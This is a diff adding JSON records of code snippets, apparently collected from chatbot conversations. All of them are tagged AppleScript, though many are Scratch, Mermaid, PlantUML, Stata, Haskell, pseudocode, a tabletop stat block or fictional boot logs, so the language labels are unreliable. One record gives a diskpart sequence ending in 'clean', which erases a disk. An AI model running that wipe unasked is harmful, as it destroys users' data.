+    "code": "on open these_items\n\trepeat with this_item in these_items\n\t\ttry\n\t\t\ttell application \"Adobe InDesign 2023\"\n\t\t\t\t-- Check if InDesign is running\n\t\t\t\tif not (exists process \"Adobe InDesign 2023\") then\n\t\t\t\t\tdisplay alert \"Adobe InDesign 2023 is not running.\"\n\t\t\t\t\treturn\n\t\t\t\tend if\n\t\t\t\t\n\t\t\t\tactivate\n\t\t\t\t-- Document Creation\n\t\t\t\tset myDoc to make document\n\t\t\t\t\n\t\t\t\ttell myDoc\n\t\t\t\t\tset horizontal measurement units of view preferences to millimeters\n\t\t\t\t\tset vertical measurement units of view preferences to millimeters\n\t\t\t\t\t\n\t\t\t\t\ttell document preferences of it\n\t\t\t\t\t\tset page height to \"283mm\"\n\t\t\t\t\t\tset page width to \"226mm\"\n\t\t\t\t\t\tset page orientation to portrait\n\t\t\t\t\tend tell\n\t\t\t\t\t\n\t\t\t\t\t-- Import pdf\n\t\t\t\t\ttell page 1 of myDoc\n\t\t\t\t\t\tset myRectangle to make rectangle with properties {geometric bounds:{0, 226, 283, 0}}\n\t\t\t\t\t\t\n\t\t\t\t\t\ttry\n\t\t\t\t\t\t\tset placedObj to place (this_item as alias) on myRectangle\n\t\t\t\t\t\t\tfit placedObj given center content\n\t\t\t\t\t\ton error errMsg\n\t\t\t\t\t\t\tdisplay alert \"Error placing PDF file: \" & errMsg\n\t\t\t\t\t\tend try\n\t\t\t\t\tend tell\n\t\t\t\tend tell\n\t\t\tend tell\n\t\ton error errMsg\n\t\t\tdisplay alert \"Error occurred: \" & errMsg\n\t\tend try\n\tend repeat\nend open",
+    "filename": "e0d561e9a243279ae9dcfb1bf6a02cd9_1.applescript"
+  },
+  {
+    "conversation_hash": "e0d561e9a243279ae9dcfb1bf6a02cd9",
+    "code_index": 5,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on open these_items\n\trepeat with this_item in these_items\n\t\ttry\n\t\t\ttell application \"Adobe InDesign 2023\"\n\t\t\t\t-- Check if InDesign is running\n\t\t\t\tif not (exists process \"Adobe InDesign 2023\") then\n\t\t\t\t\tdisplay alert \"Adobe InDesign 2023 is not running.\"\n\t\t\t\t\treturn\n\t\t\t\tend if\n\t\t\t\t\n\t\t\t\tactivate\n\t\t\t\t-- Document Creation\n\t\t\t\tset myDoc to make document\n\t\t\t\t\n\t\t\t\ttell myDoc\n\t\t\t\t\tset horizontal measurement units of view preferences to millimeters\n\t\t\t\t\tset vertical measurement units of view preferences to millimeters\n\t\t\t\t\t\n\t\t\t\t\ttell document preferences of it\n\t\t\t\t\t\tset page height to \"283mm\"\n\t\t\t\t\t\tset page width to \"226mm\"\n\t\t\t\t\t\tset page orientation to portrait\n\t\t\t\t\tend tell\n\t\t\t\t\t\n\t\t\t\t\t-- Import pdf\n\t\t\t\t\ttell page 1 of myDoc\n\t\t\t\t\t\tset myRectangle to make rectangle with properties {geometric bounds:{0, 226, 283, 0}}\n\t\t\t\t\t\t\n\t\t\t\t\t\ttry\n\t\t\t\t\t\t\tset stroke of myRectangle to nothing\n\t\t\t\t\t\t\tset placedObj to place (this_item as alias) on myRectangle\n\t\t\t\t\t\t\tfit contents of placedObj given center content\n\t\t\t\t\t\ton error errMsg\n\t\t\t\t\t\t\tdisplay alert \"Error placing PDF file: \" & errMsg\n\t\t\t\t\t\tend try\n\t\t\t\t\tend tell\n\t\t\t\tend tell\n\t\t\tend tell\n\t\ton error errMsg\n\t\t\tdisplay alert \"Error occurred: \" & errMsg\n\t\tend try\n\tend repeat\nend open",
+    "filename": "e0d561e9a243279ae9dcfb1bf6a02cd9_5.applescript"
+  },
+  {
+    "conversation_hash": "cf57239b46526959ba9dc5d2847a5c08",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"Adobe InDesign\"\n    tell active document\n        tell page 1\n            set color of every page item whose label is \"Box 1\" to \"Black\"\n        end tell\n    end tell\nend tell",
+    "filename": "cf57239b46526959ba9dc5d2847a5c08_0.applescript"
+  },
+  {
+    "conversation_hash": "6dac78f6efa6849a7977bb13800bd518",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Minccino (Tiny monstrosity, neutral)\n---------------------------------------\n\nArmor Class: 13 (natural armor)\nHit Points: 18 (4d4 + 8)\nSpeed: 30 ft., climb 20 ft.\n\nSTR | DEX | CON | INT | WIS | CHA\n--- | --- | --- | --- | --- | ---\n6   | 16  | 14  | 6   | 12  | 10\n\nSkills: Acrobatics +5, Perception +3\nSenses: passive Perception 13\nLanguages: understands Common but can't speak\nChallenge: 1/2 (100 XP)\n\nAbilities:\n-----------\n\nKeen Smell: Minccino has advantage on Wisdom (Perception) checks that rely on smell.\n\nNeat Freak: If an opponent is heavily soiled (covered in mud, drenched in substances, etc.), Minccino focuses on cleaning the target as a part of its attack, granting advantage on its next Tail Slap or Swift attack against that opponent. Additionally, if Minccino spends a turn cleaning an ally or a space within 5 feet of it, the ally gains advantage on its next attack roll or the space is considered cleansed of minor contaminants.\n\nTail Slap (Multiattack): Minccino uses its fluffy tail to perform a series of quick strikes. It makes two melee attacks: +5 to hit, reach 5 ft., one target, Hit: 4 (1d4+2) bludgeoning damage per slap.\n\nSwift: Minccino uses a quick barrage of star-shaped energy, which it can launch at one or two targets it can see within 30 feet of it. Ranged Spell Attack: +5 to hit, range 30 ft., one or two targets, Hit: 9 (2d4+4) force damage.\n\nTidy Up: As an action, Minccino can tidy up an area of 5 feet square, making it clean and free of loose debris, which could potentially unveil hidden traps or items.\n\nEvasion: If Minccino is subjected to an effect that allows it to make a Dexterity saving throw to take only half damage, Minccino instead takes no damage if it succeeds on the saving throw, and only half damage if it fails.\n\nActions:\n---------\n\nCute Charm (Recharge 5-6): Minccino uses its adorable eyes to charm a creature within 30 feet of it that can see its eyes. If the target can see Minccino, it must succeed on a DC 13 Wisdom saving throw or be charmed for 1 minute. While charmed by Minccino, the creature regards it as a friendly acquaintance. This condition ends if Minccino or its companions do anything harmful to the creature.\n\nReactions:\n-----------\n\nClean Escape: When a creature misses Minccino with a melee attack, Minccino can move up to 10 feet without provoking opportunity attacks.",
+    "filename": "6dac78f6efa6849a7977bb13800bd518_0.applescript"
+  },
+  {
+    "conversation_hash": "0fe450c89f4217dff7ec15f0e2c4a6f4",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "if the platform is \"Win32\" then\n   answer \"This application is running on Windows.\"\nelse\n   answer \"This application is not running on Windows.\"\nend if",
+    "filename": "0fe450c89f4217dff7ec15f0e2c4a6f4_1.applescript"
+  },
+  {
+    "conversation_hash": "a4a70780ecf72da6c92783c5422653c2",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "initialize game area\ninitialize snake at a starting position\ninitialize score to 0\n\nplace first item in the game area randomly\n\nwhile game is not over:\n    wait for player input to change direction\n    \n    update snake's position based on direction\n    \n    if snake's new head position overlaps with the item:\n        increase score\n        lengthen snake\n        place a new item randomly in the area\n    \n    if snake collides with itself or the boundaries:\n        set game over to true\n\ndisplay final score",
+    "filename": "a4a70780ecf72da6c92783c5422653c2_0.applescript"
+  },
+  {
+    "conversation_hash": "eb790f9f39fe0c2eae89f51dd8190696",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- Replace \"file_path\" with the actual file path on your Mac\nset file_path to \"path/to/your/file\"\n\ntell application \"Finder\"\n    try\n        open file file_path\n    on error errMsg\n        display dialog errMsg\n    end try\nend tell",
+    "filename": "eb790f9f39fe0c2eae89f51dd8190696_0.applescript"
+  },
+  {
+    "conversation_hash": "eb790f9f39fe0c2eae89f51dd8190696",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- Replace \"file_path\" with the actual file path on your Mac\nset file_path to \"path/to/your/file\"\n\ntell application \"Finder\"\n    try\n        open file file_path\n    on error errMsg number errNum\n        display dialog \"Error Number: \" & errNum & return & \"Error Message: \" & errMsg\n    end try\nend tell",
+    "filename": "eb790f9f39fe0c2eae89f51dd8190696_1.applescript"
+  },
+  {
+    "conversation_hash": "6c28f3b8565e35840cb57bab188b89ee",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- Replace \"abc\" with the exact title of the window you are looking for\nset windowTitle to \"abc\"\nset windowExists to false\n\ntell application \"System Events\"\n    -- Loop through every process (application)\n    repeat with theProcess in (every process where background only is false)\n        -- Try to get windows of the process whose name contains the window title\n        try\n            -- In case of an exact match use: (name of every window is windowTitle)\n            if exists (window where name contains windowTitle) of theProcess then\n                set windowExists to true\n                exit repeat\n            end if\n        on error\n            -- An error might occur if the current process doesn't have user interface elements\n        end try\n    end repeat\nend tell\n\n-- Do something based on whether the window exists or not\nif windowExists then\n    display dialog \"Window '\" & windowTitle & \"' exists.\"\nelse\n    display dialog \"Window '\" & windowTitle & \"' does not exist.\"\nend if",
+    "filename": "6c28f3b8565e35840cb57bab188b89ee_1.applescript"
+  },
+  {
+    "conversation_hash": "ade8ebae04247cecdd914228f4db42ea",
+    "code_index": 13,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "xtlogit SCACAAERREFINITIV [independent variables], re\n   estimates store random\n   xtlogit SCACAAERREFINITIV [independent variables], fe\n   estimates store fixed\n   hausman fixed random",
+    "filename": "ade8ebae04247cecdd914228f4db42ea_13.applescript"
+  },
+  {
+    "conversation_hash": "8feda039ba7bce71f88ffe650deebb70",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"TextEdit\"\n    if exists (document 1) then\n        set the name of document 1 to \"New Title\"\n    end if\nend tell",
+    "filename": "8feda039ba7bce71f88ffe650deebb70_0.applescript"
+  },
+  {
+    "conversation_hash": "b7a2d20595ce3695d4c10f5327db9c8d",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "@startuml\n\nleft to right direction\n\nactor Client\nactor \"Propriétaire de l'Entreprise\" as Proprietaire\nactor Administrateur\nactor System as Systeme\n\nrectangle \"Cas d'Utilisation\" {\n  usecase \"Rechercher des offres\" as UC1\n  usecase \"Consulter les Détails d'un offre\" as UC2\n  usecase \"S'Inscrire\" as UC3\n  usecase \"S'authentifier\" as UC4\n  usecase \"Effectuer une Réservation\" as UC5\n  usecase \"Laisser un Avis sur un offre\" as UC6\n  usecase \"Gérer le Profil Client\" as UC7\n  usecase \"Gérer les Favoris\" as UC8\n  usecase \"Accéder au Support Client\" as UC9\n  usecase \"Gérer les offres (Propriétaire de l'Entreprise)\" as UC10\n  usecase \"Gérer les Réservations (Propriétaire de l'Entreprise)\" as UC11\n  usecase \"Gérer les Clients (Administrateur)\" as UC12\n  usecase \"Gérer les Signalements (Administrateur)\" as UC13\n  usecase \"Consulter les Statistiques (Administrateur)\" as UC14\n  usecase \"Traiter les Paiements (Systeme)\" as UC15\n  usecase \"Envoyer des Emails (Systeme)\" as UC16\n  usecase \"Collecter des Données Analytiques (Systeme)\" as UC17\n  usecase \"Envoyer des Notifications (Systeme)\" as UC18\n  usecase \"Utiliser Google Maps pour la Cartographie (Systeme)\" as UC19\n  \n  Client --> UC1\n  Client --> UC2\n  Client --> UC3\n  Client --> UC4\n  Client --> UC5\n  Client --> UC6\n  Client --> UC7\n  Client --> UC8\n  Client --> UC9\n  \n  Proprietaire --> UC10\n  Proprietaire --> UC11\n  \n  Administrateur --> UC12\n  Administrateur --> UC13\n  Administrateur --> UC14\n  \n  Systeme --> UC15\n  Systeme --> UC16\n  Systeme --> UC17\n  Systeme --> UC18\n  Systeme --> UC19\n  \n  UC3 --> UC4 : include\n  UC3 --> UC2 : extend\n  UC5 --> UC16 : include\n  UC6 --> UC2 : extend\n  UC7 --> UC3 : include\n  UC8 --> UC2 : include\n  UC9 --> UC16 : include\n  UC10 --> UC2 : include\n  UC11 --> UC5 : include\n  UC12 --> UC16 : include\n  UC13 --> UC12 : include\n  UC14 --> UC17 : include\n  UC15 --> UC5 : include\n  UC16 --> UC18 : include\n  \n  UC19 --> UC1 : dependency\n}\n\n@enduml",
+    "filename": "b7a2d20595ce3695d4c10f5327db9c8d_0.applescript"
+  },
+  {
+    "conversation_hash": "a2050112507cefa7f3eaac255c319388",
+    "code_index": 9,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "# 색상 활성화\nset style enabled on\n\n# 소스 코드의 색상 설정\nset style source bg-color \"black\"\nset style source fg-color \"white\"\n\n# GDB 프롬프트의 색상 설정\nset style prompt bg-color \"blue\"\nset style prompt fg-color \"white\"\n\n# 기타 출력에 대한 색상 설정\nset style value bg-color \"black\"\nset style value fg-color \"green\"",
+    "filename": "a2050112507cefa7f3eaac255c319388_9.applescript"
+  },
+  {
+    "conversation_hash": "f2d4b015d90c071256dad0b9c569597d",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset [score v] to 0\n\nrepeat until <(score) = 5>\n  if <(score) = 0> then\n    ask \"What is the capital of France?\" and wait\n    if <(answer) = [paris]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 1> then\n    ask \"What color do you get when you mix blue and yellow?\" and wait\n    if <(answer) = [green]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 2> then\n    ask \"Who is the president of the USA?\" and wait\n    if <(answer) = [joe biden]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 3> then\n    ask \"What is the name of the fairy in Peter Pan?\" and wait\n    if <(answer) = [tinkerbell]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 4> then\n    ask \"What do bees produce?\" and wait\n    if <(answer) = [honey]> then\n      change [score v] by 1\n    end\n  end\nend\n\nsay (join [Your final score is: ] (score))\nstop [all v]",
+    "filename": "f2d4b015d90c071256dad0b9c569597d_0.applescript"
+  },
+  {
+    "conversation_hash": "f2d4b015d90c071256dad0b9c569597d",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset [score v] to 0\n\nrepeat until <(score) = 5>\n  if <(score) = 0> then\n    ask \"What is the capital of France?\" and wait\n    if <(answer) = [paris]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 1> then\n    ask \"What color do you get when you mix blue and yellow?\" and wait\n    if <(answer) = [green]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 2> then\n    ask \"Who is the president of the USA?\" and wait\n    if <(answer) = [joe biden]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 3> then\n    ask \"What is the name of the fairy in Peter Pan?\" and wait\n    if <(answer) = [tinkerbell]> then\n      change [score v] by 1\n    end\n  end\n  if <(score) = 4> then\n    ask \"What do bees produce?\" and wait\n    if <(answer) = [honey]> then\n      change [score v] by 1\n    end\n  end\nend\n\nsay (join [Your final score is: ] (score))\nstop [all v]",
+    "filename": "f2d4b015d90c071256dad0b9c569597d_1.applescript"
+  },
+  {
+    "conversation_hash": "00d76a2a1ad3dc72ab63dec9e30d568f",
+    "code_index": 15,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "sudo apt install ufw\nsudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw allow ssh\n# Customize the ports below according to your Skype setup\nsudo ufw allow 80/tcp\nsudo ufw allow 443/tcp\nsudo ufw enable",
+    "filename": "00d76a2a1ad3dc72ab63dec9e30d568f_15.applescript"
+  },
+  {
+    "conversation_hash": "3761e6b33dd9df0a7aaca778bc56fb87",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "[00:00.000] -- INITIATING BOOT SEQUENCE: \"Le Service Parfait\" Capsule -- \n[00:00.005] -- Boot Loader Version 1.2.4 Starting --\n[00:00.010] Checking integrity of system components...\n[00:00.015] -- All initial checks passed. --\n\n[00:00.020] Loading core transformation modules...\n[00:00.025] -- Core Transformation Engine (CTE) v2.5 Loaded --\n[00:00.030] -- Anatomy Realignment Module (ARM) v3.1 Loaded --\n[00:00.035] -- Cognitive and Language Adjustment Protocol (CLAP) v2.2 Loaded --\n[00:00.040] -- Aesthetic Enhancement Suite (AES) v4.0 Loaded --\n[00:00.045] -- Apparel Materialization Protocol (AMP) v3.3 Loaded --\n\n[00:00.050] Booting user interface...\n[00:00.055] -- User Interface loaded. Awaiting user interaction. --\n\n[00:00.060] Initiating system calibration tests...\n[00:00.065] -- CTE Calibration Successful --\n[00:00.070] -- ARM Calibration Successful --\n[00:00.075] -- CLAP Calibration Successful --\n[00:00.080] -- AES Calibration Successful --\n[00:00.085] -- AMP Calibration Successful --\n\n[00:00.090] Running system diagnostics...\n[00:00.095] -- All Systems Operational --\n\n[00:00.100] Activating user safety protocols...\n[00:00.105] -- Safety Protocols Activated --\n[00:00.110] -- Emergency Override Engaged --\n\n[00:00.115] Waiting for user input...\n[00:00.120] -- User has entered the capsule --\n\n[00:00.125] Initiating conversion sequence...\n[00:00.130] -- Safety Lock Engaged --\n[00:00.135] -- CTE Starting Transformation Process --\n[00:00.140] -- ARM Adjusting User Anatomy --\n[00:00.145] -- CLAP Adjusting Linguistic Capabilities and Cognitive Patterns --\n[00:00.150] -- AES Enhancing Aesthetics --\n[00:00.155] -- AMP Materializing Apparel --\n\n[00:00.160] Monitoring user vitals...\n[00:00.165] -- User Vitals Stable --\n\n[00:01.000] Transformation process at 25%...\n[00:02.000] Transformation process at 50%...\n[00:03.000] Transformation process at 75%...\n\n[00:04.000] Finalizing transformation...\n[00:04.005] -- Final Adjustments In-Progress --\n[00:04.010] -- User Appearance Customization Complete --\n[00:04.015] -- User Training and Conditioning Complete --\n\n[00:04.020] Transformation process complete.\n[00:04.025] -- Unlocking Safety Lock --\n[00:04.030] -- Capsule Door Opening --\n\n[00:04.035] Awaiting user emergence...\n[00:04.040] -- User Has Successfully Exited the Capsule --\n\n[00:04.045] Setting capsule to standby mode...\n[00:04.050] -- System Now On Standby. Ready for Next User --\n\n[00:04.055] -- \"Le Service Parfait\" Capsule Boot Sequence Complete. Awaiting Further Interaction. --",
+    "filename": "3761e6b33dd9df0a7aaca778bc56fb87_0.applescript"
+  },
+  {
+    "conversation_hash": "3761e6b33dd9df0a7aaca778bc56fb87",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "[07:00.000] -- INITIATING BOOT SEQUENCE: \"MediCheck\" Diagnostic Capsule -- \n[07:00.005] -- Boot Loader Version 5.8.2 Starting --\n[07:00.010] Verifying regulatory compliance...\n[07:00.015] -- Regulatory Compliance Interlock: PASS --\n\n[07:00.020] Loading core diagnostic modules...\n[07:00.025] -- Primary Diagnostic Engine (PDE) v7.4 Loaded --\n[07:00.030] -- Vitals Monitoring System (VMS) v5.1 Loaded --\n[07:00.035] -- Biochemical Analysis Suite (BAS) v6.0 Loaded --\n[07:00.040] -- Pathogen Detection Protocol (PDP) v4.3 Loaded --\n[07:00.045] -- Imaging and Resonance Analysis (IRA) v5.5 Loaded --\n\n[07:00.050] Booting user interface...\n[07:00.055] -- User Interface loaded. Awaiting user interaction. --\n\n[07:00.060] Initiating system calibration...\n[07:00.065] -- PDE Calibration Successful --\n[07:00.070] -- VMS Calibration Successful --\n[07:00.075] -- BAS Calibration Successful --\n[07:00.080] -- PDP Calibration Successful --\n[07:00.085] -- IRA Calibration Successful --\n\n[07:00.090] Running system self-diagnostics...\n[07:00.095] -- All Systems Functional --\n\n[07:00.100] Activating user safety interlocks...\n[07:00.105] -- Emergency Medical Override Engaged --\n[07:00.110] -- User Consent Verification Required --\n\n[07:00.115] Waiting for user input...\n[07:00.120] -- User has provided consent --\n\n[07:00.125] Initiating pre-scan preparation...\n[07:00.130] -- Scanning Room Sanitization Complete --\n[07:00.135] -- User Instruction Protocol Activated --\n\n[07:00.140] User entering capsule...\n[07:00.145] -- User Identity Verification and Record Match: PASS --\n[07:00.150] -- Scanning for Contraindications and Allergies: PASS --\n\n[07:00.155] Conducting general health assessment...\n[07:00.160] -- VMS Scanning Vital Signs --\n[07:00.165] -- PDE Gathering Preliminary Patient History --\n[07:00.170] -- User Vitals Within Normal Range --\n\n[07:00.175] Transitioning to targeted diagnostic protocols...\n[07:00.180] -- BAS Initiating Biochemical Analysis --\n[07:00.185] -- PDP Starting Pathogen Detection --\n[07:00.190] -- IRA Conducting Full-body Scan --\n\n[07:00.195] Completing diagnostic assessment...\n[07:00.200] -- Biochemical Markers Analyzed --\n[07:00.205] -- Pathogens Identified/Non-Identified --\n[07:00.210] -- Imaging Results Synthesized --\n\n[07:00.215] Compiling results and formulating medical report...\n[07:00.220] -- Applying Machine Learning for Diagnosis Enhancement --\n[07:00.225] -- Cross-Referencing Medical Databases --\n\n[07:00.230] Generating diagnosis and recommended action plan...\n[07:00.235] -- Diagnosis Complete --\n[07:00.240] -- Treatment Recommendations Formulated --\n\n[07:00.245] Creating encrypted patient report...\n[07:00.250] -- Report Encrypted and Stored: Regulatory Compliance Met --\n\n[07:00.255] Dispensing summary to user...\n[07:00.260] -- User Briefing Completed --\n\n[07:00.265] Transmitting detailed report to primary care physician...\n[07:00.270] -- Data Transmission: Secure and Successful --\n\n[07:00.275] Setting capsule to sanitation mode...\n[07:00.280] -- Sanitation Cycle Initiated --\n[07:00.285] -- Sanitation Cycle Complete --\n\n[07:00.290] System returning to standby...\n[07:00.295] -- System Now On Standby. Ready for Next User --\n\n[07:00.300] -- \"MediCheck\" Diagnostic Capsule Boot Sequence Complete. Awaiting Further Interaction. --",
+    "filename": "3761e6b33dd9df0a7aaca778bc56fb87_1.applescript"
+  },
+  {
+    "conversation_hash": "b00d1ed492324317930ff1cd18b5da97",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when start\n  set starRadius to generateRandomNumberInRange(1, 10)\n  set planetCount to generateRandomNumberInRange(3, 7)\n  set innerPlanetCount to round(planetCount / 2)\n  set outerPlanetCount to planetCount - innerPlanetCount\n  \n  repeat innerPlanetCount times\n    set orbitalRadius to generateRandomNumberInRange(1, starRadius)\n    set planetaryType to chooseFromList(\"Terrestrial\", \"Gas Giant\", \"Ice Giant\")\n    set planetRadius to generateRandomNumberInRange(1, 5)\n    // Code to create inner planets with defined properties\n  \n  end\n  \n  repeat outerPlanetCount times\n    set orbitalRadius to generateRandomNumberInRange(starRadius, starRadius * 2)\n    set planetaryType to chooseFromList(\"Gas Giant\", \"Ice Giant\")\n    set planetRadius to generateRandomNumberInRange(5, 10)\n    // Code to create outer planets with defined properties\n  \n  end\n  \n  set orbitalResonance to checkForOrbitalResonance()\n  // Code to handle orbital resonance\n  \n  set multiplicationNumberRange to generateRandomNumberInRange(4, 8)\n  // Code to define multiplication number range",
+    "filename": "b00d1ed492324317930ff1cd18b5da97_0.applescript"
+  },
+  {
+    "conversation_hash": "6196f48331e442d1b7a8e845be63872c",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "/routing bgp instance\nset default as=your_AS disabled=no\n\n/routing bgp peer\nadd remote-as=AS_del_peer_1 address-families=ip name=peer1 in-filter=myInFilter out-filter=myOutFilter\nadd remote-as=AS_del_peer_2 address-families=ip name=peer2 in-filter=myInFilter out-filter=myOutFilter",
+    "filename": "6196f48331e442d1b7a8e845be63872c_0.applescript"
+  },
+  {
+    "conversation_hash": "ac60d0ee3427fa6e28eb51bfd70633a8",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "flowchart LR\n    A([Iniciar Semana])\n    A -->|Pedido de Inventario (Sábado)| B(Pedido de Paletas)\n    B -->|Llegada y Recepción de Paletas (Martes)| C(Procesamiento de Paletas)\n\n    C --> D{Mercancía lista para Venta?}\n    D -- No --> E(Rescate de Mercancía)\n    D -- Sí --> F(Preparación de Mercancía)\n\n    E --> F\n    F --> G(Flechado y Organización)\n    G --> H(Promoción de Productos)\n\n    H --> I{Estrategias de Venta}\n    I -- Online --> J(Venta Online)\n    I -- Tienda Física --> K(Venta en Tienda Física)\n\n    J --> L(Actualización de Herramientas)\n    K --> L\n\n    L --> M[Sistemas de Soporte]\n    M -->|Google Drive| N(Recursos Humanos)\n    M -->|Software Alegra| O(Gestión de Bodega)\n    M -->|Software POS Square| P(Ventas y Contabilidad)\n\n    N --> Q{Fin de Semana?}\n    O --> Q\n    P --> Q\n\n    Q -- No --> A\n    Q -- Sí --> R([Cierre de Semana y Preparación para Siguiente Pedido])",
+    "filename": "ac60d0ee3427fa6e28eb51bfd70633a8_1.applescript"
+  },
+  {
+    "conversation_hash": "ac60d0ee3427fa6e28eb51bfd70633a8",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "flowchart TD\n    A([Iniciar Semana]) -->|Pedido de Inventario (Sábado)| B(Pedido de Paletas)\n    B -->|Llegada y Recepción de Paletas (Martes)| C(Procesamiento de Paletas)\n    C --> D{{Mercancía lista para Venta?}}\n    D -- No -->|Rescate de Mercancía| E(Rescate de Mercancía)\n    D -- Sí -->|Preparación de Mercancía| F(Preparación de Mercancía)\n    E --> F\n    F --> G(Flechado y Organización)\n    G --> H(Promoción de Productos)\n    H --> I{{Estrategias de Venta}}\n    I -- Online --> J(Venta Online)\n    I -- Tienda Física --> K(Venta en Tienda Física)\n    J --> L(Actualización de Herramientas)\n    K --> L\n    L --> M[Sistemas de Soporte]\n    M -->|Google Drive| N(Recursos Humanos)\n    M -->|Software Alegra| O(Gestión de Bodega)\n    M -->|Software POS Square| P(Ventas y Contabilidad)\n    N --> Q{{Fin de Semana?}}\n    O --> Q\n    P --> Q\n    Q -- No --> A\n    Q -- Sí --> R([Cierre de Semana y Preparación para Siguiente Pedido])",
+    "filename": "ac60d0ee3427fa6e28eb51bfd70633a8_3.applescript"
+  },
+  {
+    "conversation_hash": "32fce38ec8d5fa3dc0d565484469f1e0",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\ngo to x: 0 y: 0\npen down\nset pen size to 20\npen color: [230, 230, 0]",
+    "filename": "32fce38ec8d5fa3dc0d565484469f1e0_0.applescript"
+  },
+  {
+    "conversation_hash": "361b1fae7a0778b82c7a8de9e768e2eb",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\n   clear\n   forever\n   if <key [left arrow] pressed> then\n   change x by (-10)\n   end\n   if <key [right arrow] pressed> then\n   change x by (10)\n   end\n   if <key [up arrow] pressed> then\n   change y by (10)\n   end\n   if <key [down arrow] pressed> then\n   change y by (-10)\n   end",
+    "filename": "361b1fae7a0778b82c7a8de9e768e2eb_1.applescript"
+  },
+  {
+    "conversation_hash": "361b1fae7a0778b82c7a8de9e768e2eb",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\n   set [guess v] to (0)\n   set [secret number v] to (pick random (1) to (10))\n   repeat until <(guess) = (secret number)>\n   ask [What's your guess?] and wait\n   set [guess v] to (answer)\n   if <(guess) = (secret number)> then\n   say [Correct!] for (2) seconds\n   else\n   say [Try again!]\n   end",
+    "filename": "361b1fae7a0778b82c7a8de9e768e2eb_2.applescript"
+  },
+  {
+    "conversation_hash": "361b1fae7a0778b82c7a8de9e768e2eb",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\n   forever\n   if <key [space] pressed> then\n   next costume\n   play sound [pop v]\n   end\n   wait (0.5) seconds",
+    "filename": "361b1fae7a0778b82c7a8de9e768e2eb_3.applescript"
+  },
+  {
+    "conversation_hash": "85077e80547e27634700f622f6f5f483",
+    "code_index": 6,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- Pattern match on a list\n   head' :: [a] -> a\n   head' [] = error \"Empty list\"       -- Pattern matching on an empty list\n   head' (x:_) = x                     -- Pattern matching on a non-empty list, extracting the head\n\n   -- Pattern match on a tuple\n   fst' :: (a, b) -> a\n   fst' (x, _) = x                     -- Extracting the first element of the tuple",
+    "filename": "85077e80547e27634700f622f6f5f483_6.applescript"
+  },
+  {
+    "conversation_hash": "90f8526f78b09740933a9f33b13204ef",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "initialize system (setup pins, interrupts, and variables)\ninitialize time variables to 12:00 AM\n\non timer interrupt every second:\n    increment seconds\n    if seconds equals 60:\n        reset seconds to 0\n        increment minutes\n        if minutes equal 60\n            reset minutes to 0\n            increment hours\n            if hours equal 12\n                toggle AM/PM indicator\n            if hours equal 13\n                reset hours to 1\n\non button press (debounced):\n    if mode button is pressed\n        toggle between setting hours and setting minutes\n    if increment button is pressed\n        if setting hours\n            increment hours, handle roll-over and AM/PM toggle\n        if setting minutes\n            increment minutes, handle roll-over",
+    "filename": "90f8526f78b09740933a9f33b13204ef_0.applescript"
+  },
+  {
+    "conversation_hash": "e999bae3edf8b5789c2d404f3a89c7ee",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "diskpart\n   list disk\n   select disk #\n   list partition\n   select partition #\n   clean",
+    "filename": "e999bae3edf8b5789c2d404f3a89c7ee_1.applescript"
+  },
+  {
+    "conversation_hash": "4e46869e92d25349b36ecf48c493409c",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [
+      "0",
+      "i"
+    ],
+    "code": "for i from 0 to length(array) - 1\n    minIndex = i\n    for j from i+1 to length(array)\n        if array[j] < array[minIndex]\n            minIndex = j\n    if minIndex != i\n        swap array[i] and array[minIndex]",
+    "filename": "4e46869e92d25349b36ecf48c493409c_1.applescript"
+  },
+  {
+    "conversation_hash": "ee2148fd32b9749e2ce4b59ebf69645d",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- 메뉴 막대 숨기기\n    tell application \"System Events\"\n        tell dock preferences\n            set autohide menu bar to true\n        end tell\n    end tell",
